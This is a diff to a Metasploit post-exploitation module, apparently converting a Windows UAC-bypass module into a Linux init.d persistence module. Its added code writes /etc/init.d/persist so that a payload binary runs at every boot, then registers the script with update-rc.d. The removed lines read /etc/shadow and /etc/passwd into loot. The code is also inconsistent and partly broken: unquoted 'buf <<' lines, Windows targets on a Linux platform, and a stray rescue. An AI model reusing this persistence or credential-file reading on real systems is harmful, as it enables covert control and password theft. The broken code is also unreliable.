@@ -37,7 +37,6 @@ class MetasploitModule < Msf::Post
       Rank = ExcellentRanking
 
   include Msf::Post::File
-  include Msf::Post::Unix # ????
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
   include Msf::Exploit::FILEFORMAT
@@ -59,17 +58,17 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 2.1',
-                        'DisclosureDate' => 'mar 16 2017',
-                        'Platform'       => 'windows',
+                        'Version'        => '$Revision: 1.0',
+                        'DisclosureDate' => 'mai 30 2017',
+                        'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # thats no need for privilege escalation..
                         'Targets'        =>
                                 [
                                          # Tested againts windows 7 | Windows 10
-                                         [ 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
+                                         [ 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 10' ]
                                 ],
-                        'DefaultTarget'  => '5', # default its to run againts windows 10
+                        'DefaultTarget'  => '4', # default its to run againts windows 10
                         'References'     =>
                                 [
                                          [ 'URL', 'POC: goo.gl/XHQ6aF' ],
@@ -81,8 +80,8 @@ class MetasploitModule < Msf::Post
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1',              # Default its to run againts session 1
-                                         'VULN_SOFT' => 'eventvwr.exe', # Default its to run againts eventvwr.exe
+                                         'SESSION' => '1',                     # Default its to run againts session 1
+                                         'INIT_PATH' => '/etc/init.d/persist', # Default init.d persistence script full path
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -91,15 +90,13 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('EXEC_COMMAND', [ false, 'The command to be executed (eg start notepad.exe)']),
-                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status/details?' , false])
+                                OptString.new('REMOTE_PATH', [ false, 'The full path of binay to execute (eg /root/payload)'])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptString.new('VULN_SOFT', [ false, 'The binary/service vulnerable (eg CompMgmtLauncher.exe)']),
-                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe -Command to execute our command?' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys?' , false])
+                                OptString.new('INIT_PATH', [ false, 'The full path to init.d directory (eg /etc/init.d)']),
+                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                         ], self.class) 
 
         end
@@ -107,72 +104,57 @@ class MetasploitModule < Msf::Post
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #
-# This is the init.d script that provides persistence
+# Build init.d persistence script ..
 #
-buf = ""
-buf << #!/bin/sh
-buf << ### BEGIN INIT INFO
-buf << # Provides:          persistence on kali
-buf << # Required-Start:    $network $local_fs $remote_fs
-buf << # Required-Stop:     $remote_fs $local_fs     
-buf << # Default-Start:     2 3 4 5
-buf << # Default-Stop:      0 1 6  
-buf << # Short-Description: Persiste your binary (elf) in kali linux.
-buf << # Description:       Allows users to persiste your binary (elf) in kali linux systems    
-buf << ### END INIT INFO
-buf << #
-buf << # Give a little time to execute elf agent
-buf << sleep 5 > /dev/null
-buf << # Execute binary (elf agent)
-buf << ./PATH-TO-BINARY/ELF/PAYLOAD
-file_create(buf)
+def ls_stage1
+
+  init_check = datastore['INIT_PATH']    # /etc/init.d
+  remote_path = datastore['REMOTE_PATH'] # /root/payload
+  script_check = "#{init_check}/persist" # /etc/init.d/persist
+    #
+    # This is the init.d script that provides persistence on startup
+    #
+    script = File.new("#{init_check}/persist", "w+")
+    script.puts("#!/bin/sh")
+    script.puts("### BEGIN INIT INFO")
+    script.puts("# Provides:          persistence on kali")
+    script.puts("# Required-Start:    $network $local_fs $remote_fs")
+    script.puts("# Required-Stop:     $remote_fs $local_fs")
+    script.puts("# Default-Start:     2 3 4 5")
+    script.puts("# Default-Stop:      0 1 6")
+    script.puts("# Short-Description: Persiste your binary (elf) in kali linux.")
+    script.puts("# Description:       Allows users to persiste your binary (elf) in kali linux systems")
+    script.puts("### END INIT INFO")
+    script.puts("#")
+    script.puts("# Give a little time to execute elf agent")
+    script.puts("sleep 5 > /dev/null")
+    script.puts("# Execute binary (elf agent)")
+    script.puts("./#{remote_path}")
+    script.close
 
 
-# copy script to rite directory
-cmd_exec("mv #{PATH}/#{NAME} /etc/init.d/#{NAME}")
-cmd_exec("chmod +x /etc/init.d/#{NAME}")
-cmd_exec("update-rc.d #{NAME} defaults # 97 03")
+      #
+      # Config init.d startup (chmod + update-rc.d)
+      #
+      if File.exists?(script_check)
+        cmd_exec("chmod +x #{init_check}/persist")
+        cmd_exec("update-rc.d persist defaults # 97 03")
+      end
 
 
-
-    if is_root?
-      dmi_info = cmd_exec("/usr/sbin/dmidecode")
-    end
-
-    proc_scsi = read_file("/proc/scsi/scsi")
-
-
-   paths = "/home/#{datastore['USERNAME']}/script"
-   cmd_exec("mkdir -m 700 -p #{paths}")
-
-   env_paths = cmd_exec("echo $PATH").split(":")
+    #
+    # Save in loot (remote path of binary to be executed)
+    #
+    # p1 = store_loot("linux.persist", "text/plain", session, persist_file, "persist.tx", "Linux Pesistence")
+    # vprint_status("Binay remote path: #{p1.to_s}")
 
 
-   cmd_exec("chmod 777 #{random_file_path}")
-   cmd_exec("sh #{random_file_path}")
+  # error exception funtion
+  rescue ::Exception => e
+  vprint_error("Error: #{e.class} #{e}")
+end
 
-      passwd_file = read_file("/etc/passwd")
-      shadow_file = read_file("/etc/shadow")
-      # Save in loot the passwd and shadow file
-      p1 = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
-      p2 = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
-      vprint_status("Shadow saved in: #{p1.to_s}")
-      vprint_status("passwd saved in: #{p2.to_s}")
 
 
 
@@ -190,7 +172,6 @@ def run
   session = client
 
       # Variable declarations (msf API calls)
-      oscheck = client.fs.file.expand_path("%OS%")
       sysnfo = session.sys.config.sysinfo
       runtor = client.sys.config.getuid
       runsession = client.session_host
@@ -199,10 +180,10 @@ def run
 
 
     # Print banner and scan results on screen
-    print_line("    +----------------------------------------------+")
-    print_line("    | enigma fileless UAC bypass command execution |")
-    print_line("    |            Author : r00t-3xp10it             |")
-    print_line("    +----------------------------------------------+")
+    print_line("    +---------------------------------------------+")
+    print_line("    |  Kali Linux init.d persistence post-module  |")
+    print_line("    |            Author : r00t-3xp10it            |")
+    print_line("    +---------------------------------------------+")
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
     print_line("    Computer            : #{sysnfo['Computer']}")
@@ -218,11 +199,6 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
-    # check for proper operative system (windows-not-wine)
-    if not oscheck == "Windows_NT"
-      print_error("[ ABORT ]: This module only works againts windows systems")
-      return nil
-    end
     # check for proper session (meterpreter)
     # the non-return of sysinfo command reveals
     # that we are not on a meterpreter session!
@@ -240,16 +216,12 @@ def run
 # ------------------------------------
 # Selected settings to run
 # ------------------------------------
-      if datastore['EXEC_COMMAND']
+      if datastore['REMOTE_PATH']
          ls_stage1
       end
 
-      if datastore['DEL_REGKEY']
+      if datastore['DEL_PERSISTENCE']
          ls_stage2
-      end
-
-      if datastore['CHECK_VULN']
-         ls_stage3
       end
    end
 end
